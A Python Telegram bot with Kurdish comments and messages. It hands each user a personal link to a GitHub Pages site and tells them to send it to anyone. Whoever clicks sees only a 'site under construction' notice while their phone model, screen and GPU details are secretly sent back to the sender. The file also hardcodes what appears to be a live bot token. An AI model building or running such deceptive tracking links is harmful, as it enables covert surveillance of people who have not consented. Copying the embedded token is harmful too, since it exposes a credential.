import os
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY"
BASE_URL = "https://miladpeshmerga-web.github.io/my-responsive-site-/"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # لینکی ڕاستەوخۆ بە IDی بەکارهێنەر بەبێ تێکەڵکردنی ڕنდომ
    link = f"{BASE_URL}?id={user_id}"

    text = (
        "بەخێربێیت!\n\n"
        "🔗 **لینکی تایبەتی تۆ ئامادەیە:**\n\n"
        f"{link}\n\n"
        "ئەم لینکە بنێرە بۆ هەر کەسێک. کاتێک کەسەکە کلیک لەسەر دەکات:\n"
        "1. بۆ ئەو تەنها پهامی 'ماڵپەڕەکە لەژێر کارکردندایە' نیشان دەدات.\n"
        "2. بە بێ ئەوەی هەستی پێ بکات، زانیارییەکانی مۆبایلەكەی (جۆر، شاشە، GPU) ڕاستەوخۆ بۆ تۆ دەپەڕێتەوە!"
    )

    await update.message.reply_text(text, disable_web_page_preview=True, parse_mode='Markdown')

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    print("بۆتەکە چالاک بوو...")
    app.run_polling()

if __name__ == "__main__":
    main()
